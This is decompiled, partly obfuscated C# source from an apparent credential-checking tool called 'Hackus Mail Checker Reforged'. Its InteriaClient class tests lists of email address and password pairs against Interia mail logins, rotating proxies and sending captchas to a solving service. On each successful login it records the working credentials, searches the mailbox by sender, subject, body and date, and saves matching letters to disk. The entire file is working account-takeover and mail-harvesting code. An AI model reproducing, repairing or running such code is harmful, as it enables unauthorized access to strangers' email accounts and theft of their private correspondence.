using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Hackus_Mail_Checker_Reforged.Helpers;
using Hackus_Mail_Checker_Reforged.Models;
using Hackus_Mail_Checker_Reforged.Models.Enums;
using Hackus_Mail_Checker_Reforged.Net.Mail.Message;
using Hackus_Mail_Checker_Reforged.Services.Managers;
using Hackus_Mail_Checker_Reforged.Services.Settings;
using xNet;

namespace Hackus_Mail_Checker_Reforged.Net
{
	// Token: 0x020000A1 RID: 161
	internal class InteriaClient
	{
		// Token: 0x17000132 RID: 306
		// (get) Token: 0x06000528 RID: 1320 RVA: 0x00006D62 File Offset: 0x00004F62
		private SearchSettings SearchSettings
		{
			get
			{
				return SearchSettings.Instance;
			}
		}

		// Token: 0x06000529 RID: 1321 RVA: 0x00009ADA File Offset: 0x00007CDA
		public InteriaClient(Mailbox mailbox)
		{
			this._mailbox = mailbox;
		}

		// Token: 0x0600052A RID: 1322 RVA: 0x0001D610 File Offset: 0x0001B810
		public void Handle()
		{
			if (this._mailbox.Address == null)
			{
				return;
			}
			OperationResult operationResult = this.Login();
			StatisticsManager.Instance.Increment(operationResult);
			FileManager.SaveStatistics(this._mailbox.Address, this._mailbox.Password, operationResult);
			if (operationResult == OperationResult.Ok)
			{
				this.ProcessValid();
				if (!SearchSettings.Instance.Search)
				{
					MailManager.Instance.AddResult(new MailboxResult(this._mailbox));
				}
			}
		}

		// Token: 0x0600052B RID: 1323 RVA: 0x0001D684 File Offset: 0x0001B884
		private OperationResult Login()
		{
			int num = 0;
			OperationResult item;
			for (;;)
			{
				this.WaitPause();
				this.Reset();
				string captchaUid = null;
				string url = null;
				string captchaAnswer = null;
				OperationResult operationResult = this.CreateSession();
				if (operationResult != OperationResult.HttpError)
				{
					if (operationResult != OperationResult.Error)
					{
						if (operationResult == OperationResult.Captcha)
						{
							if (WebSettings.Instance.SolveCaptcha && !string.IsNullOrEmpty(WebSettings.Instance.CaptchaSolvationKey))
							{
								OperationResult operationResult2 = this.GetCaptchaInfo(ref captchaUid, ref url);
								if (operationResult2 == OperationResult.Error)
								{
									return operationResult2;
								}
								if (operationResult2 == OperationResult.HttpError)
								{
									continue;
								}
								ValueTuple<OperationResult, MemoryStream> captchaImage = this.GetCaptchaImage(url);
								item = captchaImage.Item1;
								MemoryStream item2 = captchaImage.Item2;
								if (item == OperationResult.Error)
								{
									break;
								}
								if (item == OperationResult.HttpError)
								{
									continue;
								}
								ValueTuple<OperationResult, string> valueTuple = CaptchaHelpers.CreateInstance().SolveCaptcha(Convert.ToBase64String(item2.ToArray()), <Module>.smethod_3<string>(-1051087952), false);
								operationResult2 = valueTuple.Item1;
								captchaAnswer = valueTuple.Item2;
								if (operationResult2 == OperationResult.Error)
								{
									return OperationResult.Captcha;
								}
								if (operationResult2 == OperationResult.HttpError)
								{
									continue;
								}
							}
							else
							{
								if (num <= 3)
								{
									num++;
									continue;
								}
								return OperationResult.Captcha;
							}
						}
						operationResult = this.Authenticate(captchaUid, captchaAnswer);
						if (operationResult == OperationResult.Captcha)
						{
							if (num > 3)
							{
								return OperationResult.Captcha;
							}
							num++;
						}
						else if (operationResult != OperationResult.HttpError)
						{
							return operationResult;
						}
					}
				}
			}
			return item;
		}

		// Token: 0x0600052C RID: 1324 RVA: 0x0001D7AC File Offset: 0x0001B9AC
		private OperationResult CreateSession()
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					string text = httpRequest.Get(<Module>.smethod_5<string>(-454449369), null).ToString();
					Match match = Regex.Match(text, <Module>.smethod_3<string>(1558220492));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					this._clientId = match.Groups[1].Value;
					match = Regex.Match(text, <Module>.smethod_6<string>(1782674537));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					this._crc = match.Groups[1].Value;
					match = Regex.Match(text, <Module>.smethod_3<string>(-2134450437));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					this._codeChallenge = match.Groups[1].Value;
					this._deviceUid = Guid.NewGuid().ToString();
					if (text.Contains(<Module>.smethod_3<string>(-970267786)))
					{
						return OperationResult.Captcha;
					}
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x0600052D RID: 1325 RVA: 0x0001D918 File Offset: 0x0001BB18
		private OperationResult GetCaptchaInfo(ref string captchaUid, ref string captchaUrl)
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AllowAutoRedirect = false;
					string input = httpRequest.Get(<Module>.smethod_3<string>(-2094040354), null).ToString();
					Match match = Regex.Match(input, <Module>.smethod_5<string>(-1852856992));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					captchaUid = match.Groups[1].Value;
					match = Regex.Match(input, <Module>.smethod_6<string>(1043952367));
					if (match.Success)
					{
						captchaUrl = Regex.Unescape(match.Groups[1].Value);
						return OperationResult.Ok;
					}
					return OperationResult.Error;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x0600052E RID: 1326 RVA: 0x0001D9FC File Offset: 0x0001BBFC
		[return: TupleElementNames(new string[]
		{
			"status",
			"image"
		})]
		private ValueTuple<OperationResult, MemoryStream> GetCaptchaImage(string url)
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						MemoryStream memoryStream = httpRequest.Get(url, null).ToMemoryStream();
						if (memoryStream != null && memoryStream.Length != 0L)
						{
							return new ValueTuple<OperationResult, MemoryStream>(OperationResult.Ok, memoryStream);
						}
						return new ValueTuple<OperationResult, MemoryStream>(OperationResult.Error, null);
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return new ValueTuple<OperationResult, MemoryStream>(OperationResult.HttpError, null);
		}

		// Token: 0x0600052F RID: 1327 RVA: 0x0001DA98 File Offset: 0x0001BC98
		private OperationResult Authenticate(string captchaUid = null, string captchaAnswer = null)
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.AllowAutoRedirect = false;
						List<KeyValuePair<string, string>> list = new List<KeyValuePair<string, string>>
						{
							new KeyValuePair<string, string>(<Module>.smethod_4<string>(-771887872), this._mailbox.Address),
							new KeyValuePair<string, string>(<Module>.smethod_6<string>(-1622366585), this._mailbox.Password),
							new KeyValuePair<string, string>(<Module>.smethod_4<string>(-1294858366), this._clientId),
							new KeyValuePair<string, string>(<Module>.smethod_2<string>(-1427794547), this._codeChallenge),
							new KeyValuePair<string, string>(<Module>.smethod_2<string>(653047668), this._crc),
							new KeyValuePair<string, string>(<Module>.smethod_5<string>(1645347779), <Module>.smethod_6<string>(1186507446)),
							new KeyValuePair<string, string>(<Module>.smethod_3<string>(1760270907), <Module>.smethod_3<string>(-1370513738)),
							new KeyValuePair<string, string>(<Module>.smethod_3<string>(-1651456880), <Module>.smethod_4<string>(893801997)),
							new KeyValuePair<string, string>(<Module>.smethod_2<string>(-1378835012), <Module>.smethod_4<string>(613083474)),
							new KeyValuePair<string, string>(<Module>.smethod_6<string>(1038763012), <Module>.smethod_5<string>(-415504783)),
							new KeyValuePair<string, string>(<Module>.smethod_3<string>(676908422), <Module>.smethod_3<string>(-1891989939)),
							new KeyValuePair<string, string>(<Module>.smethod_2<string>(-1261871991), <Module>.smethod_5<string>(-1209088772)),
							new KeyValuePair<string, string>(<Module>.smethod_2<string>(1518024244), <Module>.smethod_3<string>(-1811169773)),
							new KeyValuePair<string, string>(<Module>.smethod_6<string>(324257832), this._deviceUid)
						};
						if (captchaUid != null && captchaAnswer != null)
						{
							list.Add(new KeyValuePair<string, string>(<Module>.smethod_5<string>(-418286942), <Module>.smethod_6<string>(1064709787)));
							list.Add(new KeyValuePair<string, string>(<Module>.smethod_6<string>(-1599879380), captchaUid));
							list.Add(new KeyValuePair<string, string>(<Module>.smethod_3<string>(486422641), captchaAnswer));
						}
						else
						{
							list.Add(new KeyValuePair<string, string>(<Module>.smethod_4<string>(308323356), ""));
						}
						FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(list, false, null);
						httpRequest.Post(<Module>.smethod_5<string>(114610095), formUrlEncodedContent).ToString();
						string location = httpRequest.Response.Location;
						if (location.Contains(<Module>.smethod_2<string>(1942340214)))
						{
							this._ssoUrl = location;
							return OperationResult.Ok;
						}
						if (location.Contains(<Module>.smethod_6<string>(918695138)))
						{
							return OperationResult.Captcha;
						}
						return OperationResult.Bad;
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000530 RID: 1328 RVA: 0x0001DDB0 File Offset: 0x0001BFB0
		private void ProcessValid()
		{
			if (!this.SearchSettings.Search)
			{
				return;
			}
			if (this.GetSessionCookies() != OperationResult.Ok)
			{
				return;
			}
			OperationResult operationResult = OperationResult.Retry;
			int num = 0;
			bool flag = false;
			List<Request> list = new List<Request>();
			while (operationResult == OperationResult.Retry && num <= 2)
			{
				if (!flag && this.SearchSettings.Search)
				{
					operationResult = this.SearchMessages(list);
					if (operationResult == OperationResult.Ok)
					{
						flag = true;
					}
				}
				else
				{
					operationResult = OperationResult.Ok;
				}
				if (operationResult != OperationResult.Retry)
				{
					if (operationResult == OperationResult.Bad)
					{
						break;
					}
				}
				else if (ProxySettings.Instance.UseProxy)
				{
					this._proxyClient = ProxyManager.Instance.GetProxy();
				}
			}
			foreach (Request request in list)
			{
				int count = request.Count;
				if (count > 0 && (!this.SearchSettings.UseSearchLimit || this.SearchSettings.SearchLimit <= count))
				{
					MailboxResult result = new MailboxResult(this._mailbox, request.ToString(), count);
					MailManager.Instance.AddResult(result);
					StatisticsManager.Instance.IncrementFound();
					FileManager.SaveFound(this._mailbox.Address, this._mailbox.Password, request.ToString(), count);
				}
			}
		}

		// Token: 0x06000531 RID: 1329 RVA: 0x0001DEF4 File Offset: 0x0001C0F4
		private OperationResult GetSessionCookies()
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.AllowAutoRedirect = false;
						httpRequest.Get(this._ssoUrl, null).ToString();
						string location = httpRequest.Response.Location;
						if (location != <Module>.smethod_3<string>(-596939844))
						{
							return OperationResult.Error;
						}
						this.SetHeaders(httpRequest);
						httpRequest.AllowAutoRedirect = false;
						location = httpRequest.Get(<Module>.smethod_3<string>(-1720712412), null).Location;
						if (location == null)
						{
							return OperationResult.Error;
						}
						Match match = Regex.Match(location, <Module>.smethod_4<string>(656970352));
						if (!match.Success)
						{
							return OperationResult.Error;
						}
						this._xsrfToken = match.Groups[1].Value;
						return OperationResult.Ok;
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000532 RID: 1330 RVA: 0x0001E004 File Offset: 0x0001C204
		private OperationResult SearchMessages(List<Request> checkedRequests)
		{
			using (IEnumerator<Request> enumerator = this.SearchSettings.Requests.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					Request request = enumerator.Current;
					Request request3 = checkedRequests.FirstOrDefault((Request r) => InteriaClient.<>c__DisplayClass20_0.smethod_0(r.Sender, request.Sender) && InteriaClient.<>c__DisplayClass20_0.smethod_0(r.Body, request.Body) && InteriaClient.<>c__DisplayClass20_0.smethod_0(r.Subject, request.Subject));
					if (request3 == null)
					{
						request3 = request.Clone();
						request3.FindedUids = new HashSet<Uid>();
						request3.SavedUids = new HashSet<Uid>();
						checkedRequests.Add(request3);
					}
					else if (request3.IsChecked || (request3.SavedUids != null && request3.SavedUids.Count >= this.SearchSettings.DownloadLettersLimit))
					{
						continue;
					}
					Request request2 = request3;
					if (!request2.FindedUids.Any<Uid>())
					{
						OperationResult operationResult = this.Search(request2);
						if (operationResult == OperationResult.Error)
						{
							request2.IsChecked = true;
							continue;
						}
						if (operationResult == OperationResult.HttpError)
						{
							return OperationResult.Retry;
						}
					}
					if (this.SearchSettings.DownloadLetters)
					{
						if (CheckerSettings.Instance.UsePop3Limit && request2.FindedUids.Count > CheckerSettings.Instance.Pop3Limit)
						{
							request3.FindedUids = new HashSet<Uid>(request3.FindedUids.Take(CheckerSettings.Instance.Pop3Limit));
						}
						using (HashSet<Uid>.Enumerator enumerator2 = request3.FindedUids.GetEnumerator())
						{
							while (enumerator2.MoveNext())
							{
								Uid uid = enumerator2.Current;
								if (!request3.SavedUids.Any((Uid u) => u == uid))
								{
									if (request3.SavedUids.Count >= this.SearchSettings.DownloadLettersLimit)
									{
										break;
									}
									MailMessage message;
									OperationResult operationResult2 = this.FetchMessage(uid, out message);
									if (operationResult2 != OperationResult.Error)
									{
										if (operationResult2 == OperationResult.HttpError)
										{
											return OperationResult.Retry;
										}
										request3.SavedUids.Add(uid);
										FileManager.SaveWebLetter(this._mailbox.Address, this._mailbox.Password, request3.ToString(), message);
									}
									else
									{
										request3.SavedUids.Add(uid);
									}
								}
							}
						}
					}
					request2.IsChecked = true;
				}
			}
			return OperationResult.Ok;
		}

		// Token: 0x06000533 RID: 1331 RVA: 0x0001E284 File Offset: 0x0001C484
		private OperationResult Search(Request searchRequest)
		{
			if (searchRequest.Subject != null && searchRequest.Body != null)
			{
				return OperationResult.Ok;
			}
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AllowAutoRedirect = false;
					httpRequest.AddHeader(<Module>.smethod_6<string>(1801702172), <Module>.smethod_4<string>(-35515321));
					httpRequest.AddHeader(<Module>.smethod_6<string>(-1752813169), this._xsrfToken);
					httpRequest.AddHeader(<Module>.smethod_4<string>(-1488415140), <Module>.smethod_6<string>(-1495379571));
					string text = this.BuildSearchRequest(httpRequest, searchRequest);
					string input = httpRequest.Post(<Module>.smethod_4<string>(1717336297), text, <Module>.smethod_3<string>(-1143472752)).ToString();
					Match match = Regex.Match(input, <Module>.smethod_2<string>(-73222621));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					if (!(match.Groups[1].Value == <Module>.smethod_2<string>(2007619594)))
					{
						searchRequest.Count = int.Parse(match.Groups[1].Value);
						foreach (object obj in Regex.Matches(input, <Module>.smethod_3<string>(688473056)))
						{
							Match match2 = (Match)obj;
							searchRequest.FindedUids.Add(new Uid(match2.Groups[1].Value));
						}
						return OperationResult.Ok;
					}
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000534 RID: 1332 RVA: 0x0001E484 File Offset: 0x0001C684
		private OperationResult FetchMessage(Uid uid, out MailMessage message)
		{
			this.WaitPause();
			message = new MailMessage();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AllowAutoRedirect = false;
					httpRequest.AddHeader(<Module>.smethod_5<string>(2124994938), <Module>.smethod_5<string>(-497367125));
					httpRequest.AddHeader(<Module>.smethod_5<string>(-307415759), this._xsrfToken);
					httpRequest.AddHeader(<Module>.smethod_4<string>(-1488415140), <Module>.smethod_4<string>(1140862287));
					string input = httpRequest.Get(<Module>.smethod_6<string>(-1751083384) + uid.UID.ToString(), null).ToString();
					Match match = Regex.Match(input, <Module>.smethod_5<string>(-1863983748));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					message.Date = DateTime.Parse(match.Groups[1].Value);
					match = Regex.Match(input, <Module>.smethod_2<string>(1708414172));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					message.AlternateViews.Add(new Attachment(<Module>.smethod_5<string>(473053949), <Module>.smethod_4<string>(313131675) + match.Groups[1].Value));
					match = Regex.Match(input, <Module>.smethod_4<string>(-1720438466));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					message.From = match.Groups[1].Value;
					match = Regex.Match(input, <Module>.smethod_2<string>(-37858825));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					message.Subject = match.Groups[1].Value;
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000535 RID: 1333 RVA: 0x0001E698 File Offset: 0x0001C898
		private string BuildSearchRequest(HttpRequest httpRequest, Request request)
		{
			httpRequest.AddUrlParam(<Module>.smethod_4<string>(-2069085462), (int)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds);
			httpRequest.AddUrlParam(<Module>.smethod_5<string>(-1399834772), 1);
			httpRequest.AddUrlParam(<Module>.smethod_4<string>(381060148), 2);
			StringBuilder stringBuilder = new StringBuilder(<Module>.smethod_2<string>(628555505));
			if (request.Sender != null)
			{
				stringBuilder.Append(<Module>.smethod_2<string>(-1585569576) + request.Sender + <Module>.smethod_5<string>(1111656108));
			}
			if (request.Subject != null)
			{
				httpRequest.AddUrlParam(<Module>.smethod_3<string>(-1397431748), request.Subject);
			}
			else if (request.Body != null)
			{
				stringBuilder.Append(<Module>.smethod_4<string>(555383646) + request.Body + <Module>.smethod_3<string>(1298413043));
				stringBuilder.Append(<Module>.smethod_5<string>(995618864));
				httpRequest.AddUrlParam(<Module>.smethod_2<string>(79104196), request.Body);
			}
			if (request.CheckDate)
			{
				if (request.DateFrom != null)
				{
					stringBuilder.Append(<Module>.smethod_5<string>(235813400) + request.DateFrom.Value.ToString(<Module>.smethod_3<string>(88104128)) + <Module>.smethod_3<string>(1298413043));
				}
				if (request.DateTo != null)
				{
					stringBuilder.Append(<Module>.smethod_2<string>(-1952778484) + request.DateTo.Value.ToString(<Module>.smethod_4<string>(-1458953219)) + <Module>.smethod_5<string>(1111656108));
				}
			}
			else if (SearchSettings.Instance.CheckDate)
			{
				if (SearchSettings.Instance.DateFrom != null)
				{
					stringBuilder.Append(<Module>.smethod_4<string>(206736650) + SearchSettings.Instance.DateFrom.Value.ToString(<Module>.smethod_4<string>(-1458953219)) + <Module>.smethod_3<string>(1298413043));
				}
				if (SearchSettings.Instance.DateTo != null)
				{
					stringBuilder.Append(<Module>.smethod_5<string>(800501437) + SearchSettings.Instance.DateTo.Value.ToString(<Module>.smethod_5<string>(1908418633)) + <Module>.smethod_2<string>(1588727045));
				}
			}
			stringBuilder.Append(<Module>.smethod_6<string>(-1464243441));
			return stringBuilder.ToString();
		}

		// Token: 0x06000536 RID: 1334 RVA: 0x0001E94C File Offset: 0x0001CB4C
		private void SetHeaders(HttpRequest request)
		{
			request.IgnoreProtocolErrors = true;
			request.ConnectTimeout = CheckerSettings.Instance.Timeout * 1000;
			request.Cookies = this._cookies;
			request.Proxy = this._proxyClient;
			request.UserAgent = <Module>.smethod_2<string>(900569449);
		}

		// Token: 0x06000537 RID: 1335 RVA: 0x00009AE9 File Offset: 0x00007CE9
		private void Reset()
		{
			this._cookies = new CookieDictionary(false);
			if (ProxySettings.Instance.UseProxy)
			{
				this._proxyClient = ProxyManager.Instance.GetProxy();
			}
		}

		// Token: 0x06000538 RID: 1336 RVA: 0x00009AC8 File Offset: 0x00007CC8
		private void WaitPause()
		{
			ThreadsManager.Instance.WaitHandle.WaitOne();
		}

		// Token: 0x040002C4 RID: 708
		private Mailbox _mailbox;

		// Token: 0x040002C5 RID: 709
		private ProxyClient _proxyClient;

		// Token: 0x040002C6 RID: 710
		private CookieDictionary _cookies;

		// Token: 0x040002C7 RID: 711
		private string _codeChallenge;

		// Token: 0x040002C8 RID: 712
		private string _deviceUid;

		// Token: 0x040002C9 RID: 713
		private string _clientId;

		// Token: 0x040002CA RID: 714
		private string _crc;

		// Token: 0x040002CB RID: 715
		private string _xsrfToken;

		// Token: 0x040002CC RID: 716
		private string _ssoUrl;
	}
}
